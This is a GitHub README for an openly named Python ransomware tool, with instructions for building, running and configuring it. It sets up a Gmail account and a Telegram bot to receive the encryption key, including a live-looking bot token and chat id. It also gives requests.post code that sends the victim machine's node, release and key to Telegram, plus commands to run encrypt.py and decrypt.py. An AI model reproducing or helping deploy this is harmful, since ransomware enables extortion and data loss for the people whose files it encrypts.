# Python Ransomware
Simple Ransomware using Python PyQt5 and Cryptography libraries.
You can make the design you want using the design files.

## Screenshot

![](encrypt_screenshot.png)
![](decrypt_screenshot.png)

## Video
[![](https://www.youtube.com/v=wGwfdWkOal4)]
[![python instagram bot](https://img.youtube.com/vi/wGwfdWkOal4/0.jpg)](https://www.youtube.com/watch?v=wGwfdWkOal4)

## Getting Started

# Requirements
certifi==2021.5.30
cffi==1.14.6
charset-normalizer==2.0.6
cryptography==35.0.0
idna==3.2
pycparser==2.20
PyQt5==5.15.4
PyQt5-Qt5==5.15.2
PyQt5-sip==12.9.0
requests==2.26.0
urllib3==1.26.7

### Operating Instructions

#### 1) Send Email
to be able to send an email<br/>

>1)open your gmail account<br/>
>2)https://myaccount.google.com/ click<br/>
>3)Activate "Less secure app access"<br/>
example:
[![](https://www.youtube.com/watch?v=FVi-m1qmJD0)]
[![](https://www.youtube.com/v=FVi-m1qmJD0)]
[![Send Email](https://img.youtube.com/vi/FVi-m1qmJD0/0.jpg)](https://www.youtube.com/watch?v=FVi-m1qmJD0)

#### 2) Send Telegram (api) Message
Telegram api    (https://core.telegram.org/bots/api)<br/>

>1)open telegram<br/>
>2)search BotFather<br/>
>3)/newbot<br/>
>4)Choose a username for your bot (ransom0wareusername_bot)<br/>

    Use this token to access the HTTP API:
    3416572059:AAGB7p9WAe0jWamE89ftR02MR2WgbxlLZEg

Chat Id<br/>

>1)search Json Dump Bot<br/>
>2)/start<br/>
>3)telegramapi<br/>

    "from": {
        "id": 3213112048, your chat_id

    Send Message Example:

        requests.post("https://api.telegram.org/bot3416572059:AAGB7p9WAe0jWamE89ftR02MR2WgbxlLZEg/sendMessage",
                data={"chat_id": "3213112048", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})

        requests.post("https://api.telegram.org/bot<your_telegram_api>/sendMessage",
                data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})


# Installation

```sh
$ git clone https://github.com/alii76tt/python_ransomware
$ cd python_ransomware
$ pip install -r requirements.txt
$ cd Encrypt
$ python3 encrypt.py
$ cd Decrypt
$ python3 decrypt.py
```
